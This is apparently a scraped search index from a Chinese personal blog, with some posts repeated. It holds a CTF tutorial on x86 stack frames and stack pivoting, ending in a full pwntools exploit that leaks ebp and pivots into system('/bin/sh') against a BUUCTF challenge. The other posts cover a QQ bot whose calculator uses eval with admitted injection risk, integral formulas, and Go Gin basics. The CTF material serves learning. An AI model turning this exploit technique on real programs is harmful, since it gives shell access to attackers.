","date":"2022-03-05","objectID":"/articles/CTFpwn1/:0:0","series":null,"tags":null,"title":"[PWN.0x00]函数调用栈结构与栈迁移","uri":"/articles/CTFpwn1/#"},{"categories":["CTF","PWN"],"content":"前置知识：汇编语言（第4版）前半本 注：本文适用于32位程序，示意图中上为高地址区，下为低地址区。若方框中字体为蓝色表示此处内存的地址，为黑色表示此处内存存储的值。示意图中leave均表示leave|ret 函数调用栈的基本结构一些寄存器的作用： EIP：存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。 EBP：存储着当前函数栈底的地址，通过将其与偏移地址相加减获取变量的地址。 ESP：始终指向栈顶。 在进入一个函数时，会执行如下操作。 push eip+4 push ebp mov ebp,esp 在执行完退出时，会执行如下操作。 mov esp,ebp pop ebp pop eip 即leave和ret。 整个过程描述起来就是，先将函数执行完成之后应当去执行的语句（eip+4）和主程序的的基址（ebp）压入栈中，然后再将ebp指向栈底。在函数执行完之后，再进行一遍上述过程的逆过程。 函数调用栈工作时的结构如下图： 其中val0地址处存储主程序传入的参数，如果有多个传入参数，它们将按照从右到左的顺序被push入栈中，val1~3为函数申请的局部变量。它们将按照申请的顺序被放入栈中。举例来讲，形如： void func(int a){ int b,c; char s[10]; } 这样的函数，a将被存入val0，b将被存入val1，c将被存入val2，s将被存入val3。 考虑最基础的栈溢出题目，由于程序将按照地址从低到高的顺序存储字符串变量，所以当s的数据由选手掌控且溢出空间足够大时，s将溢出到val2，val3，甚至旧ebp，eip的位置上。所以选手就可以控制旧ebp，eip处的内容，实现劫持程序返回，让程序执行恶意代码的目的。 但有时候，选手能掌控的数据量很有限，不足以支持我们完成过于复杂的劫持指令，对于这种情况，其中一种解题方法就是栈迁移。 栈迁移栈迁移的核心思想是劫持当前函数已经压入栈中的eip段，将其内容改为一次leave，同时修改旧ebp段，借助旧ebp为跳板，实现对esp的控制，进而在下一次ret中，修改eip的值，实现目的。 也就是说，要构造栈中数据如图所示： 至于为什么要-4，后面模拟的过程中读者自能体会。 好了，现在当前函数已经执行完了，程序将自行执行一次leave和ret。执行之后的结果如图： 然后程序会执行eip指向的地址的命令，即再执行一次leave，ret，执行后栈的情况如图： 这样我们就完成了借助ebp为跳板，将esp指向目标eip的位置，控制程序在最后一次ret（即pop eip）的时候，将eip赋值成了我们想让它执行的函数的地址。 例题：ciscn_2019_s_4BUUCTF在线评测 (buuoj.cn) 所谓“从零开始的Pwner生活”第一题，差点直接给我整劝退。 惯例checksec，只开了NX。 ida分析得到： int vul() { char buf[40]; // [esp+0h] [ebp-28h] BYREF memset(buf, 0, 0x20u); read(0, buf, 0x30u); printf(\"Hello, %s\\n\", buf); read(0, buf, 0x30u); return printf(\"Hello, %s\\n\", buf); } 发现只有8个字节的溢出空间，不足以支持一次完整的ROP，但是可以读两次，且第一次读入有输出，因此可以利用第一次读入来泄露ebp（注：这里的ebp指的是vul函数的ebp，即read函数栈帧中的旧ebp）。 第一次读满0x28个字节，由于printf输出的时候会一直输出到\\x00为止，所以会把ebp也一起输出来。 在第二次输入的时候构造一个栈迁移的结构，将栈迁移到我们能控制的buf段。 结合文章开头函数调用栈的知识，不难理解，‘bin/sh’和buf_addr+12都将作为输入的参数输入到system函数中，所以程序最终执行的效果就是获取了shell。 注意到我们需要填入的信息中需要我们预先知道buf的地址，可以在本地动态调试（gdb）中获取ebp和buf地址的差值，然后作差得到。不要想当然地认为buf和ebp的差值就是0x28，这只是在read函数中的情况，此处的ebp指的是vul函数中的ebp，即read函数中ebp指向的oldebp。 EXP： from psutil import process_iter from pwn import * context(arch=\"i386\",log_level=\"debug\") op=0 e=ELF(\"ciscn-s-4.bin\") sys_addr=e.symbols['system'] leave_addr=0x080484B8 def main(): if op==1: zeroy=process(\"ciscn-s-4.bin\") else: zeroy=remote(\"node4.buuoj.cn\",27827) payload1=b'a'*0x24+b\"bbbb\" zeroy.recvuntil(\"name?\") zeroy.send(payload1) zeroy.recvuntil(\"bbbb\") ebp_addr=u32(zeroy.recv(4)) print(\"ebp_addr: \",hex(ebp_addr)) buf_addr=ebp_addr-0x38 payload2=p32(sys_addr)+b'aaaa'+p32(buf_addr+12)+b'/bin/sh\\x00' payload2=payload2.ljust(0x28,b'a')+p32(buf_addr-4)+p32(leave_addr) zeroy.send(payload2) zeroy.interactive() main() ","date":"2022-03-05","objectID":"/articles/CTFpwn1/:0:0","series":null,"tags":null,"title":"[PWN.0x00]函数调用栈结构与栈迁移","uri":"/articles/CTFpwn1/#函数调用栈的基本结构"},{"categories":["CTF","PWN"],"content":"前置知识：汇编语言（第4版）前半本 注：本文适用于32位程序，示意图中上为高地址区，下为低地址区。若方框中字体为蓝色表示此处内存的地址，为黑色表示此处内存存储的值。示意图中leave均表示leave|ret 函数调用栈的基本结构一些寄存器的作用： EIP：存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。 EBP：存储着当前函数栈底的地址，通过将其与偏移地址相加减获取变量的地址。 ESP：始终指向栈顶。 在进入一个函数时，会执行如下操作。 push eip+4 push ebp mov ebp,esp 在执行完退出时，会执行如下操作。 mov esp,ebp pop ebp pop eip 即leave和ret。 整个过程描述起来就是，先将函数执行完成之后应当去执行的语句（eip+4）和主程序的的基址（ebp）压入栈中，然后再将ebp指向栈底。在函数执行完之后，再进行一遍上述过程的逆过程。 函数调用栈工作时的结构如下图： 其中val0地址处存储主程序传入的参数，如果有多个传入参数，它们将按照从右到左的顺序被push入栈中，val1~3为函数申请的局部变量。它们将按照申请的顺序被放入栈中。举例来讲，形如： void func(int a){ int b,c; char s[10]; } 这样的函数，a将被存入val0，b将被存入val1，c将被存入val2，s将被存入val3。 考虑最基础的栈溢出题目，由于程序将按照地址从低到高的顺序存储字符串变量，所以当s的数据由选手掌控且溢出空间足够大时，s将溢出到val2，val3，甚至旧ebp，eip的位置上。所以选手就可以控制旧ebp，eip处的内容，实现劫持程序返回，让程序执行恶意代码的目的。 但有时候，选手能掌控的数据量很有限，不足以支持我们完成过于复杂的劫持指令，对于这种情况，其中一种解题方法就是栈迁移。 栈迁移栈迁移的核心思想是劫持当前函数已经压入栈中的eip段，将其内容改为一次leave，同时修改旧ebp段，借助旧ebp为跳板，实现对esp的控制，进而在下一次ret中，修改eip的值，实现目的。 也就是说，要构造栈中数据如图所示： 至于为什么要-4，后面模拟的过程中读者自能体会。 好了，现在当前函数已经执行完了，程序将自行执行一次leave和ret。执行之后的结果如图： 然后程序会执行eip指向的地址的命令，即再执行一次leave，ret，执行后栈的情况如图： 这样我们就完成了借助ebp为跳板，将esp指向目标eip的位置，控制程序在最后一次ret（即pop eip）的时候，将eip赋值成了我们想让它执行的函数的地址。 例题：ciscn_2019_s_4BUUCTF在线评测 (buuoj.cn) 所谓“从零开始的Pwner生活”第一题，差点直接给我整劝退。 惯例checksec，只开了NX。 ida分析得到： int vul() { char buf[40]; // [esp+0h] [ebp-28h] BYREF memset(buf, 0, 0x20u); read(0, buf, 0x30u); printf(\"Hello, %s\\n\", buf); read(0, buf, 0x30u); return printf(\"Hello, %s\\n\", buf); } 发现只有8个字节的溢出空间，不足以支持一次完整的ROP，但是可以读两次，且第一次读入有输出，因此可以利用第一次读入来泄露ebp（注：这里的ebp指的是vul函数的ebp，即read函数栈帧中的旧ebp）。 第一次读满0x28个字节，由于printf输出的时候会一直输出到\\x00为止，所以会把ebp也一起输出来。 在第二次输入的时候构造一个栈迁移的结构，将栈迁移到我们能控制的buf段。 结合文章开头函数调用栈的知识，不难理解，‘bin/sh’和buf_addr+12都将作为输入的参数输入到system函数中，所以程序最终执行的效果就是获取了shell。 注意到我们需要填入的信息中需要我们预先知道buf的地址，可以在本地动态调试（gdb）中获取ebp和buf地址的差值，然后作差得到。不要想当然地认为buf和ebp的差值就是0x28，这只是在read函数中的情况，此处的ebp指的是vul函数中的ebp，即read函数中ebp指向的oldebp。 EXP： from psutil import process_iter from pwn import * context(arch=\"i386\",log_level=\"debug\") op=0 e=ELF(\"ciscn-s-4.bin\") sys_addr=e.symbols['system'] leave_addr=0x080484B8 def main(): if op==1: zeroy=process(\"ciscn-s-4.bin\") else: zeroy=remote(\"node4.buuoj.cn\",27827) payload1=b'a'*0x24+b\"bbbb\" zeroy.recvuntil(\"name?\") zeroy.send(payload1) zeroy.recvuntil(\"bbbb\") ebp_addr=u32(zeroy.recv(4)) print(\"ebp_addr: \",hex(ebp_addr)) buf_addr=ebp_addr-0x38 payload2=p32(sys_addr)+b'aaaa'+p32(buf_addr+12)+b'/bin/sh\\x00' payload2=payload2.ljust(0x28,b'a')+p32(buf_addr-4)+p32(leave_addr) zeroy.send(payload2) zeroy.interactive() main() ","date":"2022-03-05","objectID":"/articles/CTFpwn1/:0:0","series":null,"tags":null,"title":"[PWN.0x00]函数调用栈结构与栈迁移","uri":"/articles/CTFpwn1/#栈迁移"},{"categories":["CTF","PWN"],"content":"前置知识：汇编语言（第4版）前半本 注：本文适用于32位程序，示意图中上为高地址区，下为低地址区。若方框中字体为蓝色表示此处内存的地址，为黑色表示此处内存存储的值。示意图中leave均表示leave|ret 函数调用栈的基本结构一些寄存器的作用： EIP：存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。 EBP：存储着当前函数栈底的地址，通过将其与偏移地址相加减获取变量的地址。 ESP：始终指向栈顶。 在进入一个函数时，会执行如下操作。 push eip+4 push ebp mov ebp,esp 在执行完退出时，会执行如下操作。 mov esp,ebp pop ebp pop eip 即leave和ret。 整个过程描述起来就是，先将函数执行完成之后应当去执行的语句（eip+4）和主程序的的基址（ebp）压入栈中，然后再将ebp指向栈底。在函数执行完之后，再进行一遍上述过程的逆过程。 函数调用栈工作时的结构如下图： 其中val0地址处存储主程序传入的参数，如果有多个传入参数，它们将按照从右到左的顺序被push入栈中，val1~3为函数申请的局部变量。它们将按照申请的顺序被放入栈中。举例来讲，形如： void func(int a){ int b,c; char s[10]; } 这样的函数，a将被存入val0，b将被存入val1，c将被存入val2，s将被存入val3。 考虑最基础的栈溢出题目，由于程序将按照地址从低到高的顺序存储字符串变量，所以当s的数据由选手掌控且溢出空间足够大时，s将溢出到val2，val3，甚至旧ebp，eip的位置上。所以选手就可以控制旧ebp，eip处的内容，实现劫持程序返回，让程序执行恶意代码的目的。 但有时候，选手能掌控的数据量很有限，不足以支持我们完成过于复杂的劫持指令，对于这种情况，其中一种解题方法就是栈迁移。 栈迁移栈迁移的核心思想是劫持当前函数已经压入栈中的eip段，将其内容改为一次leave，同时修改旧ebp段，借助旧ebp为跳板，实现对esp的控制，进而在下一次ret中，修改eip的值，实现目的。 也就是说，要构造栈中数据如图所示： 至于为什么要-4，后面模拟的过程中读者自能体会。 好了，现在当前函数已经执行完了，程序将自行执行一次leave和ret。执行之后的结果如图： 然后程序会执行eip指向的地址的命令，即再执行一次leave，ret，执行后栈的情况如图： 这样我们就完成了借助ebp为跳板，将esp指向目标eip的位置，控制程序在最后一次ret（即pop eip）的时候，将eip赋值成了我们想让它执行的函数的地址。 例题：ciscn_2019_s_4BUUCTF在线评测 (buuoj.cn) 所谓“从零开始的Pwner生活”第一题，差点直接给我整劝退。 惯例checksec，只开了NX。 ida分析得到： int vul() { char buf[40]; // [esp+0h] [ebp-28h] BYREF memset(buf, 0, 0x20u); read(0, buf, 0x30u); printf(\"Hello, %s\\n\", buf); read(0, buf, 0x30u); return printf(\"Hello, %s\\n\", buf); } 发现只有8个字节的溢出空间，不足以支持一次完整的ROP，但是可以读两次，且第一次读入有输出，因此可以利用第一次读入来泄露ebp（注：这里的ebp指的是vul函数的ebp，即read函数栈帧中的旧ebp）。 第一次读满0x28个字节，由于printf输出的时候会一直输出到\\x00为止，所以会把ebp也一起输出来。 在第二次输入的时候构造一个栈迁移的结构，将栈迁移到我们能控制的buf段。 结合文章开头函数调用栈的知识，不难理解，‘bin/sh’和buf_addr+12都将作为输入的参数输入到system函数中，所以程序最终执行的效果就是获取了shell。 注意到我们需要填入的信息中需要我们预先知道buf的地址，可以在本地动态调试（gdb）中获取ebp和buf地址的差值，然后作差得到。不要想当然地认为buf和ebp的差值就是0x28，这只是在read函数中的情况，此处的ebp指的是vul函数中的ebp，即read函数中ebp指向的oldebp。 EXP： from psutil import process_iter from pwn import * context(arch=\"i386\",log_level=\"debug\") op=0 e=ELF(\"ciscn-s-4.bin\") sys_addr=e.symbols['system'] leave_addr=0x080484B8 def main(): if op==1: zeroy=process(\"ciscn-s-4.bin\") else: zeroy=remote(\"node4.buuoj.cn\",27827) payload1=b'a'*0x24+b\"bbbb\" zeroy.recvuntil(\"name?\") zeroy.send(payload1) zeroy.recvuntil(\"bbbb\") ebp_addr=u32(zeroy.recv(4)) print(\"ebp_addr: \",hex(ebp_addr)) buf_addr=ebp_addr-0x38 payload2=p32(sys_addr)+b'aaaa'+p32(buf_addr+12)+b'/bin/sh\\x00' payload2=payload2.ljust(0x28,b'a')+p32(buf_addr-4)+p32(leave_addr) zeroy.send(payload2) zeroy.interactive() main() ","date":"2022-03-05","objectID":"/articles/CTFpwn1/:0:0","series":null,"tags":null,"title":"[PWN.0x00]函数调用栈结构与栈迁移","uri":"/articles/CTFpwn1/#例题ciscn_2019_s_4"},{"categories":["WEB"],"content":" 前言2月14情人节过于孤独，于是萌生了写个qqbot玩的想法。 概述项目地址：zeroy0410/NoyaBot (github.com) 配置完go-cqhttp的基本信息之后，就可以用它的api来操纵bot的账号进行各种操作，同时go-cqhttp会转发接收到的信息到指定端口。只需要在本地搭建一个服务器对收到的信息进行一定规则的回复即可。 我使用了Python-Flask作为项目的框架。 机器人功能（截止2022/3/3） 闲聊 回答指定的问题 设定回答问题的概率 数学计算 计算能用一行字符串表示的Sympy库格式的数据 一言 翻译 /teach A|B #当输入为A时以B来回答 /let talk_enable (True or False) #是否在群内开启闲聊 /let talk_probability 一个浮点数 #闲聊时接话的概率 /ask A #问话就会回答（无视上面两条指令的限制） /calc sympy库格式的一条算式 #不要尝试计算复杂度过高的式子，计算时间过长会阻塞进程 /hito 参数# 一言参数参考https://hitokoto.cn/ /trans 内容|from|to #如trans Hello World!|en|zh 英译中 注意事项数学计算功能使用了eval函数让python能够解析输入的代码，我过滤掉了大部分常用的注入语句，但仍有被注入的风险。 ","date":"2022-03-03","objectID":"/articles/noya/:0:0","series":null,"tags":null,"title":"基于go-cqhttp的机器人NoyaBot","uri":"/articles/noya/#"},{"categories":["WEB"],"content":" 前言2月14情人节过于孤独，于是萌生了写个qqbot玩的想法。 概述项目地址：zeroy0410/NoyaBot (github.com) 配置完go-cqhttp的基本信息之后，就可以用它的api来操纵bot的账号进行各种操作，同时go-cqhttp会转发接收到的信息到指定端口。只需要在本地搭建一个服务器对收到的信息进行一定规则的回复即可。 我使用了Python-Flask作为项目的框架。 机器人功能（截止2022/3/3） 闲聊 回答指定的问题 设定回答问题的概率 数学计算 计算能用一行字符串表示的Sympy库格式的数据 一言 翻译 /teach A|B #当输入为A时以B来回答 /let talk_enable (True or False) #是否在群内开启闲聊 /let talk_probability 一个浮点数 #闲聊时接话的概率 /ask A #问话就会回答（无视上面两条指令的限制） /calc sympy库格式的一条算式 #不要尝试计算复杂度过高的式子，计算时间过长会阻塞进程 /hito 参数# 一言参数参考https://hitokoto.cn/ /trans 内容|from|to #如trans Hello World!|en|zh 英译中 注意事项数学计算功能使用了eval函数让python能够解析输入的代码，我过滤掉了大部分常用的注入语句，但仍有被注入的风险。 ","date":"2022-03-03","objectID":"/articles/noya/:0:0","series":null,"tags":null,"title":"基于go-cqhttp的机器人NoyaBot","uri":"/articles/noya/#前言"},{"categories":["WEB"],"content":" 前言2月14情人节过于孤独，于是萌生了写个qqbot玩的想法。 概述项目地址：zeroy0410/NoyaBot (github.com) 配置完go-cqhttp的基本信息之后，就可以用它的api来操纵bot的账号进行各种操作，同时go-cqhttp会转发接收到的信息到指定端口。只需要在本地搭建一个服务器对收到的信息进行一定规则的回复即可。 我使用了Python-Flask作为项目的框架。 机器人功能（截止2022/3/3） 闲聊 回答指定的问题 设定回答问题的概率 数学计算 计算能用一行字符串表示的Sympy库格式的数据 一言 翻译 /teach A|B #当输入为A时以B来回答 /let talk_enable (True or False) #是否在群内开启闲聊 /let talk_probability 一个浮点数 #闲聊时接话的概率 /ask A #问话就会回答（无视上面两条指令的限制） /calc sympy库格式的一条算式 #不要尝试计算复杂度过高的式子，计算时间过长会阻塞进程 /hito 参数# 一言参数参考https://hitokoto.cn/ /trans 内容|from|to #如trans Hello World!|en|zh 英译中 注意事项数学计算功能使用了eval函数让python能够解析输入的代码，我过滤掉了大部分常用的注入语句，但仍有被注入的风险。 ","date":"2022-03-03","objectID":"/articles/noya/:0:0","series":null,"tags":null,"title":"基于go-cqhttp的机器人NoyaBot","uri":"/articles/noya/#概述"},{"categories":["WEB"],"content":" 前言2月14情人节过于孤独，于是萌生了写个qqbot玩的想法。 概述项目地址：zeroy0410/NoyaBot (github.com) 配置完go-cqhttp的基本信息之后，就可以用它的api来操纵bot的账号进行各种操作，同时go-cqhttp会转发接收到的信息到指定端口。只需要在本地搭建一个服务器对收到的信息进行一定规则的回复即可。 我使用了Python-Flask作为项目的框架。 机器人功能（截止2022/3/3） 闲聊 回答指定的问题 设定回答问题的概率 数学计算 计算能用一行字符串表示的Sympy库格式的数据 一言 翻译 /teach A|B #当输入为A时以B来回答 /let talk_enable (True or False) #是否在群内开启闲聊 /let talk_probability 一个浮点数 #闲聊时接话的概率 /ask A #问话就会回答（无视上面两条指令的限制） /calc sympy库格式的一条算式 #不要尝试计算复杂度过高的式子，计算时间过长会阻塞进程 /hito 参数# 一言参数参考https://hitokoto.cn/ /trans 内容|from|to #如trans Hello World!|en|zh 英译中 注意事项数学计算功能使用了eval函数让python能够解析输入的代码，我过滤掉了大部分常用的注入语句，但仍有被注入的风险。 ","date":"2022-03-03","objectID":"/articles/noya/:0:0","series":null,"tags":null,"title":"基于go-cqhttp的机器人NoyaBot","uri":"/articles/noya/#注意事项"},{"categories":["Math","文化课"],"content":"高等数学上册(微积分)必背公式总结 - 知乎 (zhihu.com) 导数： $$ \\begin{align} \u0026[\\cos(\\omega x+\\varphi)]^{(n)}=\\omega^n\\cos(\\omega x+\\frac{n\\pi}{2}+\\varphi)\\\\ \u0026[\\sin(\\omega x+\\varphi)]^{(n)}=\\omega^n\\sin(\\omega x+\\frac{n\\pi}{2}+\\varphi)\\\\ \\end{align} $$ 重难点公式： $$ \\begin{align} \u0026\\int\\frac{1}{a^2+x^2}dx=\\frac{1}{a}arctan\\frac{x}{a}+C\\\\ \u0026\\int\\frac{1}{a^2-x^2}dx=\\frac{1}{2a}ln|\\frac{a+x}{a-x}|+C\\\\ \u0026\\int\\frac{1}{\\sqrt{a^2-x^2}}dx=arcsin\\frac{x}{a}+C\\\\ \u0026\\int\\frac{1}{\\sqrt{x^2\\pm a^2}}dx=ln|x+\\sqrt{x^2\\pm a^2}|+C\\\\ \u0026\\int{tan\\ x}dx=-ln|cos\\ x|+C\\\\ \u0026\\int{cot\\ x}dx=ln|sin\\ x|+C\\\\ \u0026\\int{csc\\ x}dx=ln|csc\\ x-cot\\ x|+C\\\\ \u0026\\int{sec\\ x}dx=ln|sec\\ x+tan\\ x|+C\\\\ \u0026\\int{sec^2\\ x}dx=tan\\ x+C\\\\ \u0026\\int{csc^2\\ x}dx=-cot\\ x+C\\\\ \u0026\\int{sec\\ x*tan\\ x}dx=sec\\ x+C\\\\ \u0026\\int{csc\\ x*cot\\ x}dx=-csc\\ x+C\\\\ \\end{align} $$ 凑系数，拆项： $$ \\int{\\frac{x}{(2x+3)^2}}dx=\\frac{1}{2}\\int{\\frac{2x+3-3}{(2x+3)^2}}dx=\\frac{1}{2}\\int{\\frac{2x+3}{(2x+3)^2}}dx-\\frac{1}{2}\\int\\frac{3}{(2x+3)^2}dx\\ … $$ 分子包含多项的，直接无法求解可以拆项求。 常见的配凑： $$ \\begin{align} \u0026xe^x:\\\\ \u0026\\int\\frac{1+x}{x(xe^x+1)}dx=\\int\\frac{(1+x)e^x}{xe^x(xe^x+1)}dx=\\int\\frac{1}{xe^x(xe^x+1)}d(xe^x)\\overset{t=xe^x}=\\int\\frac{1}{t(t+1)}dt\\\\ \u0026xlnx:\\\\ \u0026\\int\\frac{(1+lnx)dx}{1+x^2ln^2x}=\\int\\frac{1}{1+(xlnx)^2}d(xlnx)\\\\ \u0026\\frac{1}{\\sqrt{x}}:\\\\ \u0026\\int\\frac{1}{\\sqrt{x(x+4)}}dx=2\\int\\frac{1}{2\\sqrt{x}\\sqrt{x+4}}dx=2\\int\\frac{1}{\\sqrt{4+\\sqrt{x}^2}}d{\\sqrt{x}}\\\\ \u0026e^x:\\\\ \u0026\\int f(e^x){\\rm dx}=\\int\\frac{f(e^x)}{e^x}{\\rm de^x}=\\int\\frac{f(t)}{t}{\\rm dt} \\end{align} $$ 一些题目： 1. $$ \\begin{align} (1):\\int\\frac{\\rm dx}{x\\sqrt{x^2-1}} \u0026=\\int\\frac{\\rm dx}{x^2\\sqrt{1-\\left(\\frac{1}{x}\\right)^2}}\\\\ \u0026=-\\int\\frac{\\rm d\\frac{1}{x}}{\\sqrt{1-\\left(\\frac{1}{x}\\right)^2}}\\\\ \u0026=-\\arcsin\\frac{1}{x}+C\\\\ \\end{align} $$ 2. $$ \\begin{align} (2):\\int\\frac{x{\\rm dx}}{x^2\\sqrt{x^2-1}}\u0026 =\\int\\frac{\\rm d\\sqrt{x^2-1}}{(\\sqrt{x^2-1})^2+1}\\\\ \u0026=\\arctan\\sqrt{x^2-1}+C \\end{align} $$ 3. $$ (3)令\\sqrt{x^2-1}=x-t,有x=\\frac{t^2+1}{2t}\\\\ \\begin{align} \\int\\frac{\\rm dx}{x\\sqrt{x^2-1}} \u0026=-2\\int\\frac{\\rm dt}{t^2+1}\\\\ \u0026=-2\\arctan t+C\\\\ \u0026=-2\\arctan(x-\\sqrt{x^2-1})+C \\end{align} $$ 4. $$ \\begin{align} (4)I=\\int\\sqrt{Ax^2+B}{\\rm dx} \u0026=x\\sqrt{Ax^2+B}-\\int\\frac{(Ax^2+B)-B}{\\sqrt{Ax^2+B}}{\\rm dx}\\\\ \u0026=x\\sqrt{Ax^2+B}-I+\\int\\frac{B}{\\sqrt{Ax^2+B}}{\\rm dx} \\end{align} $$ 奇怪的配凑： $$ \\int\\frac{1}{\\sqrt{e^{2x}-1}}dx=\\int\\frac{1}{\\sqrt{e^{2x}(1-e^{-2x})}}dx=\\int\\frac{e^{-x}}{\\sqrt{1-e^{-2x}}} $$ 有理函数积分： $$ \\begin{align} \u0026\\int\\frac{x-2}{x^2+x+1}dx=\\int\\frac{A(x^2+x+1)’+B}{x^2+x+1}dx\\\\ \u0026A(2x+1)+B=x-2=\u003eA=\\frac{1}{2},B=-\\frac{5}{2}\\\\ \u0026=\\frac{1}{2}\\int\\frac{1}{x^2+x+1}d(x^2+x+1)-\\frac{5}{2}\\int\\frac{1}{x^2+x+1}dx\\\\ \u0026=\\frac{1}{2}\\int\\frac{1}{x^2+x+1}d(x^2+x+1)-\\frac{5}{2}\\int\\frac{1}{(x+\\frac{1}{2})^2+\\frac{3}{4}}\\\\ \u0026\\text{ps:当分母}\\triangle\u003c0\\text{时才可以使用,否则直接裂项即可} \\end{align} $$ 表格法求积分： 不定积分表格法的本质(推导) - 知乎 (zhihu.com) $$ \\int{x^2e^{2x}}dx=\\frac{1}{2}x^2e^{2x}-\\frac{1}{2}xe^{2x}+\\frac{1}{4}e^{2x}+C $$ 常见三角换元题： $$ \\begin{align} \u0026\\int\\frac{x^2}{\\sqrt{1-x^2}}dx\\overset{x=sint}{=}\\int\\frac{sin^2t}{\\sqrt{1-sin^2t}}costdt=\\int{sintdt}\\\\ \u0026\\int{x^2{\\sqrt{4-x^2}}}dx\\overset{x=2sint}{=}16\\int{sin^2tcos^2t}dt=8\\int{(\\frac{1}{2}sin2t)^2}dt\\\\ \\end{align} $$ 凑微分： $$ \\begin{align} \u0026\\int\\frac{1}{x\\sqrt{1+x^2}}dx=\\int{\\frac{x}{x^2\\sqrt{1+x^2}}}dx=\\frac{1}{2}\\int{\\frac{1}{x^2\\sqrt{1+x^2}}}dx^2\\overset{t=x^2}{=}\\frac{1}{2}\\int{\\frac{1}{t\\sqrt{1+t}}}dt\\\\ \u0026set\\ u=\\sqrt{1+t}\\\\ \u0026=\\frac{1}{2}\\int{\\frac{2u}{(u^2-1)u}}du=\\int{\\frac{1}{u^2-1}}du=-\\frac{1}{2}ln|\\frac{1+u}{1-u}|+C \\end{align} $$ 倒代换： $$ \\int{\\frac{1}{x\\sqrt{x^4+x^2+1}}}dx\\overset{t=\\frac{1}{x}}{=}-\\int{\\frac{1}{\\frac{1}{t}\\sqrt{\\frac{1}{t^4}+\\frac{1}{t^2}+1}}}dx=-\\frac{\\frac{1}{t}}{\\sqrt{\\frac{1}{t^4}+\\frac{1}{t^2}+1}}dt=-\\frac{1}{2}\\int{\\frac{1}{\\sqrt{(t^2+\\frac{1}{2})^2+(\\frac{\\sqrt{3}}{2})^2}}}d(t^2+\\frac{1}{2}) $$ 一些巧题： $$ \\begin{align} \u0026\\int{\\frac{1}{x\\sqrt{x^2-1}}}dx=\\int{\\frac{1}{x\\sqrt{x^2(1-\\frac{1}{x^2})}}}dx=\\int{\\frac{1}{x^2\\sqrt{1-\\frac{1}{x^2}}}}=-\\int{\\frac{1}{\\sqrt{1-(\\frac{1}{x})^2}}}d(\\frac{1}{x})\\\\ \u0026\\int{\\frac{1-lnx}{(x-lnx)^2}}dx=\\int{\\frac{\\frac{1-lnx}{x^2}}{(1-\\frac{lnx}{x}","date":"2022-02-16","objectID":"/articles/math-integrate/:0:0","series":null,"tags":null,"title":"高等数学（上） 不定积分 总结","uri":"/articles/math-integrate/#"},{"categories":["golang-web"],"content":" 自带的net/http库的使用http库提供了HTTP服务的用户端和服务端的实现。 官方文档 Go语言基础之net/http | 李文周的博客 (liwenzhou.com) 示例代码 监听本地端口，在浏览器输出Hello World字符串。 func sayHello(w http.ResponseWriter,r *http.Request){ //ResponseWriter为服务端返回的内容 fmt.Fprintln(w, \"Hello World!\") } func main(){ http.HandleFunc(\"/\",sayHello) http.ListenAndServe(\":8080\",nil) } ","date":"2022-02-11","objectID":"/articles/Golang-web1/:0:0","series":null,"tags":null,"title":"Golang|Gin Web development for Beginners","uri":"/articles/Golang-web1/#"},{"categories":["golang-web"],"content":" 自带的net/http库的使用http库提供了HTTP服务的用户端和服务端的实现。 官方文档 Go语言基础之net/http | 李文周的博客 (liwenzhou.com) 示例代码 监听本地端口，在浏览器输出Hello World字符串。 func sayHello(w http.ResponseWriter,r *http.Request){ //ResponseWriter为服务端返回的内容 fmt.Fprintln(w, \"Hello World!\") } func main(){ http.HandleFunc(\"/\",sayHello) http.ListenAndServe(\":8080\",nil) } ","date":"2022-02-11","objectID":"/articles/Golang-web1/:0:0","series":null,"tags":null,"title":"Golang|Gin Web development for Beginners","uri":"/articles/Golang-web1/#自带的nethttp库的使用"},{"categories":["golang-web"],"content":" Gin框架 简介Gin 是一个用 Go (Golang) 编写的 HTTP web 框架。 它是一个类似于 martini 但拥有更好性能的 API 框架, 优于 httprouter，速度提高了近 40 倍。如果你需要极好的性能，使用 Gin 吧。 官方中文文档 Gin框架介绍及使用 | 李文周的博客 (liwenzhou.com) 特性 Gin v1 稳定的特性: 零分配路由。 仍然是最快的 http 路由器和框架。 完整的单元测试支持。 实战考验。 API 冻结，新版本的发布不会破坏你的代码。 框架初识使用Gin框架返回一个json文件 func sayHello(c *gin.Context/*gin框架中的临时变量，便于后续响应请求*/){ c.JSON(http.StatusOK,gin.H{//返回一个json数据 \"message\":\"HelloWorld\", }) } func main(){ r:=gin.Default()//获取gin框架默认路由对象 r.GET(\"/\",sayHello)//处理向\"/\"目录发起的get请求，并将其使用sayHello函数处理 r.Run() } 项目实践中一般使用匿名函数： r.GET(\"/\",func(c *gin.Context){ c.JSON(http.StatusOK,gin.H{ \"message\":\"HelloWorld\", }) }) 使用Gin框架返回一个html文件 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.html\")//解析模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.html\",gin.H{}) }) r.Run() } 模板渲染template package - html/template - pkg.go.dev Go语言标准库之http/template | 李文周的博客 (liwenzhou.com) 一个简单示例 type User struct { //成员变量名必须为大写，使其可以被外部访问 Name string Gender string Age int } func sayHello(w http.ResponseWriter, r *http.Request){ // 定义模板 // 解析模板 t, _ := template.ParseFiles(\"./hello.tmpl\") // 渲染模板 u1 := User{ // u1.Name Name: \"zeroy\", Gender: \"男\", Age: 18, } m1 := map[string]interface{}{ \"name\": \"zeroy\", \"gender\": \"男\", \"age\": 18, } hobbyList := []string{ \"乒乓球\", \"网球\", \"羽毛球\", } t.Execute(w, map[string]interface{}{ \"u1\": u1, \"m1\": m1, \"hobby\": hobbyList, }) } func main() { http.HandleFunc(\"/\", sayHello) http.ListenAndServe(\":9000\", nil) } 在Gin框架中渲染模板 func main(){ r:=gin.Default() r.LoadHTMLFiles(\"hello.tmpl\")//加载模板 r.GET(\"/\",func(c *gin.Context){ c.HTML(http.StatusOK,\"hello.tmpl\",gin.H{//向模板中传递参数 \"name\": \"zeroy\", \"age\": 18, }) }) r.Run() } 模板文件： \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003ename: {{.name}}\u003c/h1\u003e \u003ch1\u003eage: {{.age}}\u003c/h1\u003e \u003c/body\u003e 